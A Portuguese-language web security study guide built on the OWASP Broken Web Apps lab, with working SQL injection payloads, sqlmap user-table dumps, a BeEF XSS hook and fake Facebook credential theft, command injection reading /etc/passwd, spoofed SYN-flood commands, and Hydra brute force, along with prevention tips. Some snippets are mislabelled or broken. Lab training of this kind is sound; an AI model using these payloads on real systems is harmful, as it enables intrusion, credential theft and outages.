# Segurança WEB

## Top 10 Vulnerabilities for 2021 (<https://owasp.org/Top10/>)

- Broken Access Control.
- Cryptographic Failures.
- Injection.
- Insecure Design.
- Security Misconfiguration.
- Vulnerable and Outdated Components.
- Identification and Authentication Failures.
- Software and Data Integrity Failures.
- Security Logging and Monitoring Failures.
- Server-Side Request Forgery (SSRF)

## laboratório OWASP

A OWASP é uma instituição que tem como objetivo disseminar e propagar conceitos e aprendizados a respeito de segurança WEB.
Dentre muitos projetos para testes que a OWASP disponibiliza esse estudo utiliza o BWA, que é um servidor WEB que contem várias aplicações web com diversas vunerabilidades.

- <https://owasp.org/>

Para esse estudo utilizaremos também o Owasp ZAP, um proxy com outras funcionalidades.

- <https://owasp.org/www-project-zap/>

Para usar o laboratório baixar o virtual box e as imagens, importa-las no virtual box e conecta-las usando uma rede NAT ou only host.

- maquina do hacker: <https://cdimage.kali.org/kali-2022.4/kali-linux-2022.4-installer-amd64.iso>
- servidor web: <https://sourceforge.net/projects/owaspbwa/files/1.2/OWASP_Broken_Web_Apps_VM_1.2.ova/download>

## SQL injection

- Abrir ip do servidor web no firefox e acessar a aplicação OWAP Multillidae II.
- Para estes teste vamos voltar para o menu principal e usar a aplicação bWAPP, faz-se o login, acessar a opção SQL injection (Search/GET)
- Podemos seguir com ataque para descobrir os nomes das tabelas, usando:

  ```
  teste' UNION select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=database() -- 
  ```

    O 'teste' no inicio é só para não trazer algum dado dos filmes antes, por que provavel que não haja nenhum filme com esse nome.

    E com esse injeção de SQL para mostrar as colunas da tabela users:

  ```
  teste' UNION select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users'and table_schema=database() -- 
  ```

  com as colunas conseguimos mostrar os dados que nos interessa:

  ```
  teste' UNION select 1,login,password,email,secret,6,7 from users -- 
  ```

- Não é precisamos verificar as vulnerabilidades manualmente, podemos utilizar algumas ferramentas pra isso, usaremos o SQLMAP. Para isso, precisaremos utilizar o ZAP para coletar as informações de cookie.
- Baixar o OWASP ZAP na máquina do hacker
  - <https://www.zaproxy.org/download/>
- Instalar o OWASP ZAP (substituir o X pela versão baixada)

    ```bash
    sudo chmod +x ZAP_2_x_x_unix.sh
    sudo ./ZAP_2_x_x_unix.sh
    ```

- Ao Abrir o ZAP clica-se no ícone do firefox no menu superior, o firefox abrirá e todo site que for acessado por ele será analisado, bem como suas requests e responses aparecerão no zap na aba History na parte inferior. no firefox, nas duas laterais terão alguns alertas e infos a respeito de segurança web do site acessado.

- Para visualizar as informações que precisamos utilizando o ZAP, faz-se o login no bWAPP se já não tiver feito, acessar a mesma opção SQL injection (Search/GET), e daz a busca por qualquer filme. Ver-se pelo histórico do ZAP a request, desta request usaremos o cookie, mais precisamente os dados da sessão: PHPSESSID, security_level e o url da request usando, neste caso: "http://10.0.2.5/bWAPP/sqli_1.php?title=teste&action=search"

- Usando o SQLMAP

  ```
  sqlmap -u "http://10.0.2.5/bWAPP/sqli_1.php?title=teste&action=search" --proxy="http://127.0.0.1:8080" --cookie="PHPSESSID=alsjdbasjdnalsjfaabdjASBDJKABSD; security_level=0"
  ```

  O proxy é o configurado para o OWASP ZAP, sua porta pode ser alterada nas configurações deles. Com esse comando ,serão feitas algumas perguntas e o resultado deve ser qual tipo de banco e sua versão. Mas usando outros comandos específicos do SQLMAP é possível extrair muito mais informação.

    Descobrir o BD atual:

    ```bash
                sqlmap -u "http://10.0.2.5/bWAPP?sqli_1.php/title=teste&action=search" --proxy="http://127.0.0.1:8080" --cookie="PHPSESSID=alsjdbasjdnalsjfaabdjASBDJKABSD; security_level=0" --current-db
    ```

    Com nome do banco de dados! Agora, vamos ver se existem mais tabelas neste banco.

    ```bash
                sqlmap -u "http://10.0.2.5/bWAPP?sqli_1.php/title=teste&action=search" --proxy="http://127.0.0.1:8080" --cookie="PHPSESSID=alsjdbasjdnalsjfaabdjASBDJKABSD; security_level=0" --tables -D bwapp
    ```

- Descobrimos uma tabela chamada users. Agora, acrescente a flag <strong>--dump -T users. Acessamos os dados de usuários do sistema! E ainda conseguimos quebrar os hashs.

    ```bash
                sqlmap -u "http://10.0.2.5/bWAPP?sqli_1.php/title=teste&action=search" --proxy="http://127.0.0.1:8080" --cookie="PHPSESSID=alsjdbasjdnalsjfaabdjASBDJKABSD; 
                security_level=0" --dump -T users -D bwapp
    ```

- Prevenção: Como evitar este ataque, no desenvolvimento da aplicação? Vamos ver como seria em JavaScript. Bastaria que nós separássemos os códigos da query SQL. Para isso, em JavaScript utilizaremos:

    ```javascript
    PreparedStatement stmt = connection.prepareStatement(sql);
    stmt.setString(​1​,usuario);
    stmt.setString(​2​,senha);
    stmt.execute();
    ```

## XSS injection

- instalação e configuração do beef. Beef é uma ferramenta de exploração de injeção de XSS.

  ```bash
  git clone https://gitlab.com/kalilinux/packages/beef-xss.git
  ```

  caso haja problema com ruby, tentar instalar o rvm com os comandos abaixo:

  ```bash
  sudo apt-get autoremove  
  ```

  ```bash
  sudo rm -rf /usr/local/lib/ruby
  sudo rm -rf /usr/lib/ruby
  sudo rm -f /usr/local/bin/ruby
  sudo rm -f /usr/bin/ruby
  sudo rm -f /usr/local/bin/irb
  sudo rm -f /usr/bin/irb
  sudo rm -f /usr/local/bin/gem
  sudo rm -f /usr/bin/gem
  ```

  ```bash
  \curl -L https://get.rvm.io | bash -s -- --ignore-dotfiles --autolibs=0 --ruby
  ```

  ```bash
  source /etc/profile.d/rvm.sh
  ```

  ```bash
  type rvm | head -n 1
  ```

  checando:

  ```bash
  ruby -v
  ```

- editar credenciais do beef. Ir na pasta beef-xss e editar o arquivo config.yaml na linha onde tem credentials e inserir um user e password que preferir.

- Para executar o beef

  ```bash
  sudo ./beef
  ```

  deve aparecer uma resposta ao final as informações:

  Hook URL: <http://127.0.0.1:3000/hook.js>

  UI URL:   <http://127.0.0.1:3000/ui/panel>

  HTTP Proxy: <http://127.0.0.1:6789>
  BeEF server started (press control+c to stop)

- Injetando XSS apontando pro beef

  insira o código abaixo no input ou campo de entrada do XSS na aplicação a ser testada ou pode fazer o teste com a aplicação da OWASP <http://10.0.2.4/mutillidae/index.php?page=add-to-your-blog.php>, inserindo no campo de inserção de post do blog.

  ```html
  <script src="http://127.0.0.1:3000/hook.js"><script>
  ```

  Com isso o script no beef (máquina do invasor), será executado quando listado os posts e no painel do beef (<http://127.0.0.1:3000/ui/panel>) aparecerá um log com várias informações a respeito da máquina que está acessando a máquina da vítima. e há vários comandos que podem ser executados pelo beef que irão refletir na máquina do cliente.

- Exemplo de captura de credenciais do facebook.

  - Carrgar a página que executa o script injetado.
  - Clicar no Hooked Browser identificado pelo beef.
  - Na Aba commands buscar por 'Pretty Theft'.
  - Clicar em execute no canto inferior direito.
  - Aparececerá na tela do broser da vítima um formulário fake do facebook. Ao preecher o mesmo, verá que as informações estarão disponíveis no beef.

- É possível ao invés de usar o 'Pretty theft', usar o 'Fake Flash Update' e fazer com que a vítima baixe alguma arquivo malicioso.

- Prevenção: Para previnir desse tipo de ataque é preciso fazer o "scaping" da execução dos scripts. No java por exemplo poderia ser assim:

  ```java
  String encoding = ESAPI.encoder().encodeForJavaScript();
  ```

  a variável encoding seria apresentada na listagem e não seria executada como HTML ou XML.

  Se estiver usando JSP, o que me dá dó de você, em caso de uma listagem em tabel pode simplesmente inserir o atributo escapeXML="true" em todas as tags <display:column>

  no nodejs por exemplo é possível usar bibliotecas e tratar a entrada como por exemplo:

  ```javascript
  var v = require('validator');
  var escaped_input = v.escape(user_input);
  ```

  mais sobre:  <https://www.stackhawk.com/blog/nodejs-xss-guide-examples-and-prevention/>

## Command Injection

É uma vunerabilidade que permite a execução de comando no servidor através da aplicação WEB.

- Pode-se exemplificar essa vunerabilidade através do laboratório da OWASP na aplicação de url: <http://10.0.2.7/miltilidae/index.php?page=dns-lookup.php>
e digitar no input Hostname/IP:

```bash
  google.com.br && pwd && whiami && ls -la
```

O pwd informará a pasta que está e o usuário e as informações com relação as permissões de todos os arquivos na pasta. Pode se também inserir o comando

```bash
google.com.br && cat /etc/passwd
```

que mostrará todos os usuários do servidor.

dica: ao configurar seu servidor, nunca configure seus usuários sistema com permissão de execução.

- Uso do commix com owasp zap

É importante dizer que, o uso do commix --help ajuda na hora de conhecer o commix.

Podemos usar para teste a aplicação bWAPP só que com a seleção de 'OS Command Injection', ou no link: <http://10.0.2.7/bWAPP/portal.php>.

- Com o OWASP ZAP acessar a aplicação a ser testada, fazer uma busca comum e após isso vamos coletar algumas informações no OWASP ZAP para usar no commix, o cookie e a ação contida no request (no caso acima &form=submit) bem como o url da request <http://10.0.2.7/bWAPP/commandi.php>

- O comando do commix ficaria assim

  ```bash
  sudo commix -u http://10.0.2.7/bWAPP/commandi.php --cookie='PHPSESSID=pgxasjbdksavjbdks; security_level=0' --data='target=10.0.2.7&form=submit'
  ```

  poderá ser possível ter um pseudo-terminal, onde os comandos executados neste são executados no server invadida.

## Directory Transversal (LFI/RFI)

- LFI e RFI são siglas para local/remote file inclusion, se trata de uma vunerabilidade que permite a inclusão de arquivos maliciosos no servidor WEB.

- Pode-se exemplificar essa vunerabilidade através do laboratório da OWASP na aplicação de url: <http://10.0.2.4/bWAPP/directory_traversal_1.php?page=message.txt>
ou no Portal bWAPP e seleção Directory Transversal - Files. É possível ver que o url já deixa a dica que a mensagem na tela vem do arquivo message.txt, pode-se neste caso testar no lugar de message.txt o caminho /etc/passwd e visualizar todos os usuários do servidor ou /etc/ssh/sshd_config o que pode permitir um ataque via ssh.

- Prevenção: ter o controle de permissões dos diretorios e arquvios que podem ser acessados pelos usuários.
- Prevenção: evitar a inclusão de arquivos como entrada fornecida pelo usuário.

## DoS

- Denial of Service
- Testar com a ferramenta hping. Esta ferramenta pode ser usada para:
  - Traceroute/ping hosts atrás de um firewall que bloqueia tentativas usando os utilitários padrão.
  - Ataque de negação de serviço - DoS usando hping3 com IP falsificado no Kali Linux
  - Execute a verificação inativa (agora implementada no nmap com uma interface de usuário fácil).
  - Teste as regras de firewall.
  - IDS de teste.
  - Explorar vulnerabilidades conhecidas de pilhas TCP / IP.
  - Pesquisa em rede.
  - Escreva aplicativos reais relacionados ao teste e segurança de TCP / IP.
  - Testes automatizados de firewall.
  - Pesquisa em rede e segurança quando houver necessidade de emular um comportamento complexo de TCP / IP.
- Para testar, basta uma linha de comando. Citada abaixo:

  ```bash
  hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source <url>
  ```

  explicação do comando:
  - -c 10000: numero de pacotes a serem enviados
  - -d 120: tamanho de cada pacote enviado
  - -S: envio apenas de pacotes SYN
  - -w 64: Tamanho da janela TCP -​ A opção de escala de janela TCP é uma opção para aumentar o tamanho da janela de recebimento permitido no Protocolo de Controle de Transmissão acima do seu antigo valor máximo de 65.535 bytes. Esta opção TCP, juntamente com várias outras, é definida na IETF RFC 1323, que trata de redes longas e complexas.
  - -p 21: Porta de destino (A porta 21 é utilizada pelo FTP). Pode ser usada qualquer porta.
  - --flood: para enviarmos os pacotes o mais rápido possível
  - --rand-source: Usando ips aleatórios para envio dos pacotes
- Desta forma derrubaremos o site.

- Testar outras formas de DoS com hping, a primeira, um simples SYN flood:

  ```bash
  hping3 -S -P -U --flood -V --rand-source <url>Curso: ​Segurança em Aplicações WEB
  ```

- TCP connect flood

  ```bash
  nping --tcp-connect -rate=90000 -c 900000 -q
  ```

- Prevenção: Para evitar este problema, é preciso uma aplicação que proteja o servidor, ou mesmo, manter o kernel atualizado. Pois, esta vulnerabilidade é fácilmente evitada.

## Brute Force

### OWASP ZAP

Pode-se usar como teste a aplicação da multilidae do laboratório da OWASP. <http://10.0.2.7/multilidae/index.php?page=login.php>. Lembrando que o ip depende da sua VM.

- Abrir a página de login a ser testada com o mozila pela OWASP ZAP e tenta fazer um login com um usuário que não exista.
- No ZAP ver no histórico a requisição feita, na aba 'request' na segunda caixa de texto aparece os parâmetros da requisição, selecionar o admin e clicar com botão direito do mouse na opção 'Fuzz'.
- No modal que aparece, clicar em payload, o tipo já vem selecionado para String, nos Contents: inserir as palavras que irão ser testadas para login. Pode-se também mudar de String para file e selecionar um arquivo de dicionário por exemplo. Em /usr/share/wordlists/metapolt do kalilinux já possuem várias 'wordlists', nesse caso de usuário padrão. Há também para senhas.
- Clicar no parametro de password e fazer o mesmo.
- Se for o caso pode-se incluir processors para tratar as informações antes de enviar, um base 64 por exemplo.
- Clicar em Start Fuzzer. Aparece uma aba Fuzzer na parte inferior do ZAP, nesta aba indicará os 'matchs'.

### CEWL

Esta ferramenta serve para gerar wordlists com base em um site.

- instalando cewl

  ```bash
  sudo apt-get install cewl
  ```

- Podemos testar com o seguinte comando:

  ```bash
  cewl "http://10.0.2.7/wordpress/" -d 1 -w wordlist.txt
  ```

  onde wordlist.txt é o arquivo onde tão as palavras de possibilidade de usuário e/ou senha.

  se houver problemas relacionados ao ruby, gem, bundle e etc. Tente executar o comando abaixo, se não funcionar, "dá um google".

  ```bash
  sudo gem pristine --all
  ```

  com o comando abaixo é possível saber quantas palavras contem na wordlist criada.

    ```bash
  cat wordlist.txt | wc -l
  ```

### Hydra

O hydra é uma ferramenta feita exclusivamente para brute force.

Pode-se usar como teste a aplicação da dvwa do laboratório da OWASP. <http://10.0.2.4/dvwa/login.php>. Lembrando que o ip depende da sua VM.

- Abrir a página de login a ser testada com o mozila pela OWASP ZAP e tenta fazer um login com um usuário que não exista.
- No ZAP ver no histórico a requisição feita, na aba 'request' na segunda caixa de texto aparece os parâmetros da requisição.

- Para testar com o hydra, vamos utilizar a wordlist criada com CEWL anteriormente.
- Executar o comando:

  ```bash
  sudo hydra -L /home/kali/wordlist1.txt -P /home/kali/wordlist1.txt 10.0.2.4 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
  ```

  neste teste estamos usando a mesma wordlist para o usuário (L) e para senha (P). Indicamos o ip e o método http, no caso post (identificado pelo OWASP ZAP) e o form indica que é um formulário e a string "/dvwa/login.php" é o que indica a página a ser atacada e o que vem após o ":" são os parâmetros enviados via http. Deve-se substituir o usuário e senha da request por ^USER^ e ^PASS^ indicando para o Hydra os parâmetros que serão testados. A mensagem indicada 'Login failed' indica para o hydra qual mensagem de retorno negativo. e o -V é o verbose para mostrar o que ta acontecendo no terminal.

  normalmente é bastante demorado, então pra efeito de teste pode-se criar outras wordlist com poucas palavras, e dentre eles inserir um password e senha válidos.

  Ao final o hydra informará os alvos encontrados.

- Prevenção: Pode ser feita na camada de infra-estrutura, fazendo algumas configurações em proxies e etc. Ou pelo código, inserindo número de tentativas máximas por usuário por exemplo. Exemplos: errou a senha 3 vezes bloqueiao usuário, criar senhas mais complexas, modificar senhas periodicamente.

## Métodos de descoberta automática

### OWASP ZAP Scan

- O prórpio OWASP ZAP ao acessar um site pelo link do chrome no aplicativo, ver-se nas laterais da tela vários indicativos de vunerabilidades, bem como  no quarta opção da direita de cima para baixo tem-se o 'Active Scan Start', esta opção irá varrer o site enquanto navega-se por ele, esta varredura pode ser acompanhada no ZAP, bem como o resultado na aba 'Active Scan', na Aba 'Alerts' serão indicados os problemas/vunerabilidades por ordem de seriedade e cor, uma possível solução é indicada.

### Nikto

Para ver as opções do nikto, pode-se executar o comando:

```bash
nikto -H
```

se trata de uma ferramenta com muitas opções, dentre eleas o Tunning+, onde é possível fazer o scan de vunerabilidades de forma mais específica.

- Para uma varredura, executar o comando:

```bash
nikto -h http://10.0.2.4/mutillidae/ -o report.html
```

onde o -h refere-se ao host e o -o o arquivo de relatório gerado ao final

### WPScan

- Para instalar o wpscan basta executar o comando:

  ```bash
  sudo apt-get install wpscan
  ```

- Para iniciar uma varredura em um site, por exemplo <http://10.0.2.4/wordpress>, executa-se o comando:

  ```bash
  wpscan --url http://10.0.2.4/wordpress
  ```

  em caso de erro relacionado a <strong>GemNotFoundException</strong>, executar o comando:

  ```bash
  sudo gem install wpscan
  ```

- Para enumerar os usuários:

  ```bash
  wpscan --url http://10.0.2.4/wordpress --enumerate u
  ```

  mostrará os usuários identificados neste caso 'admin'

- Para verificar os plugins vuneráveis: (vp -> vunerables plugins)

  ```bash
  wpscan --url http://10.0.2.4/wordpress --enumerate vp
  ```

  para temas vuneráveis, usar o vt. para verificar mais opções ver:
  
  ```bash
  wpscan --help
  ```
  
### Wapiti

manual: <https://wapiti.limsi.fr/manual.html>

- Para acessar o help

  ```bash
  wapiti -h
  ```

- Para ver os módulos:

  ```bash
  wapiti --list-modules
  ```

- Para fazer a varredura de módulos específicos:

  ```bash
  wapiti -u http://10.0.2.4/mutillidae -m sql, xss, xxe

  Ao final um relatório é gerado, e é indicado onde foi salvo. Neste relatório será exibido cada vunerabilidade, a origem tipo e possível solução.
  ```

- Para scan geral de todos os módulos com default, usando por exemplo o site da aplicação do laboratório da OWASP <http://10.0.2.4/mutillidae>.

  ```bash
  wapiti -u http://10.0.2.4/mutillidae
  ```

  Ao final um relatório é gerado, e é indicado onde foi salvo. Neste relatório será exibido cada vunerabilidade, a origem tipo e possível solução.

### Golismero

Muito similar ao wapiti, só que com relatorios mais elaborados dentre outras coisas.

- Instalação
  - Habilitando repositorio Strech no Kali Linux

    ```bash
    sudo vim /etc/apt/sources.list.d/debian.list
    ```

    ```bash
    deb http://httpredir.debian.org/debian stretch main
    ```

    ```bash
    sudo apt update
    ```

  - instalando as dependencias

    Em caso de falha por causa de heat packages prossiga.

      ```bash
      sudo su -l
      apt-get install docutils-doc docutils-common python-pygments
      apt-get install python2.7 python2.7-dev git perl nmap sslscan
      ```

    ```bash
    sudo su -l
    apt-get install docutils-doc docutils-common python-pygments
    apt-get install python2.7 python2.7-dev git perl nmap sslscan
    ```

    ```bash
    cd /opt
    wget https://bootstrap.pypa.io/get-pip.py
    python3 get-pip.py
    ```
  
  - instalando golismero

    ```bash
    git clone https://github.com/golismero/golismero.git
    ```

    ```bash
    cd golismero
    pip install -r requirements.txt
    pip install -r requirements_unix.txt
    ln -s ${PWD}/golismero.py /usr/bin/golismero
    exit
    ```

    - Em caso de erro relacionado a versão do python instalar o gerenciador de versão do python com os comandos:

      ```bash
      sudo apt install -y build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python3-openssl git
      ```

      ```bash
      curl https://pyenv.run | bash
      ```

      ```bash
      echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.zshrc
      echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.zshrc
      echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init --path)"\nfi' >> ~/.zshrc
      ```

      ```bash
      pyenv install 2.7.18
      ```

      ```bash
      pyenv global 2.7.18
      ```

  - Ao digitar o comando no terminal:

    ```bash
    golismero
    ```

    deve aparecer a tela assim:

    ```bash
    /-------------------------------------------\
    | GoLismero 2.0.0b6, The Web Knife          |
    | Copyright (C) 2011-2014 GoLismero Project |
    |                                           |
    | Contact: contact@golismero-project.com    |
    \-------------------------------------------/

    usage: golismero [-h] [--help] [-f FILE] [--config FILE] [--user-config FILE] [-p NAME] [--ui-mode MODE] [-v] [-q] [--color] [--no-color]
                    [--audit-name NAME] [-db DATABASE] [-nd] [-i FILENAME] [-ni] [-o FILENAME] [-no] [--full] [--brief] [--allow-subdomains]
                    [--forbid-subdomains] [--parent] [-np] [-r DEPTH] [--follow-redirects] [--no-follow-redirects] [--follow-first]
                    [--no-follow-first] [--max-connections MAX_CONNECTIONS] [-l MAX_LINKS] [-pu USER] [-pp PASS] [-pa ADDRESS] [-pn PORT]
                    [--cookie COOKIE] [--user-agent USER_AGENT] [--cookie-file FILE] [--persistent-cache] [--volatile-cache] [-a PLUGIN:KEY=VALUE]
                    [-e PLUGIN] [-d PLUGIN] [--max-concurrent N] [--plugin-timeout N] [--plugins-folder PATH]
                    COMMAND [TARGET [TARGET ...]]
    golismero: error: too few arguments

    Use -h to see the quick help, or --help to show the full help text.
    ```

- Utilizando golismero

  - Para acesso ao help:

    ```bash
    golismero --help
    ```

    neste arquivo ao final há alguns exemplos que podem ajudar.

  - Para varrer um url:

    ```bash
    golismero scan http://10.0.2.4/mutillidae
    ```

    ao final ele informa na tela um relarório. Em algumas das vunerabilidades é informada a solução.

  - É possível gerar um relatório em HTML.

    - salvando no db do golismero.

      ```bash
      golismero scan http://10.0.2.4/mutillidae/ -db dbteste-scan.db -no
      ```

      o '-no' é para não mostrar o relatorio no terminal

    - exportando relatório em HTML:

      ```bash
      golismero report relatorio-teste01.html -db dbteste-scan.db
      ```

      basta abrir o relatório no navegador.

  - Especificando o plugin

    para o caso de uso de todos os plugins de brute force:

    ```bash
    golismero scan http://10.0.2.4/mutillidae/ -e brute*
    ```

    para o caso de uso de todos os plugins de nikto:

    ```bash
    golismero scan http://10.0.2.4/mutillidae/ -e nikto
    ```
